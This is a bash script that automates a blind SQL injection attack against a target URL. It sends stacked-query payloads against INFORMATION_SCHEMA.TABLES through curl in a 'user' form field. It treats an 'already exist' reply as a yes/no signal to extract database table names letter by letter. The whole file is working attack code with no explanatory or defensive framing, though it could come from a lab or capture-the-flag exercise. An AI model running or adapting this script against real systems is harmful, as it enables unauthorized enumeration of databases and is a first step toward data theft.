#!/bin/bash

URL=$1
METHOD="GET"
COOKIE=""
DATA="amount=55&pass=bb&drop=balance=a"
FOUND=()
TABLE_NUM=0
WORD=""
CHAR=""

echo $URL, $METHOD, $COOKIE, $DATA



findChar(){ #size, startLetter
    for t_char in  `rexgen "[$2-Z_\-0-9]"`
    do
        #curl -X $METHOD --cookie $COOKIE -d $DATA $URL -d "username_reg='; SELECT * FROM INFORMATION_SCHEMA.TABLES WHERE SUBSTRING(TABLE_NAME, 1, $1)='$FOUND$t_char';--"
        if `curl -X $METHOD -d $DATA $URL -d "user='; SELECT * FROM INFORMATION_SCHEMA.TABLES WHERE SUBSTRING(TABLE_NAME, 1, $1)='$WORD$t_char';--" 2>/dev/null | grep -iq "already exist"`
        then
            CHAR=$t_char
            return 0
        fi
    done
    return 1
}

for j in {A..Z}
do
    echo $j
    for i in {1..99}
    do
        echo $i, $WORD
        if findChar $i $j
        then
            WORD=$WORD$CHAR
        else
            FOUND[$TABLE_NUM]=$WORD
            TABLE_NUM=$TABLE_NUM+1
            echo $WORD
            WORD=""
            break
        fi
    done
done

echo $FOUND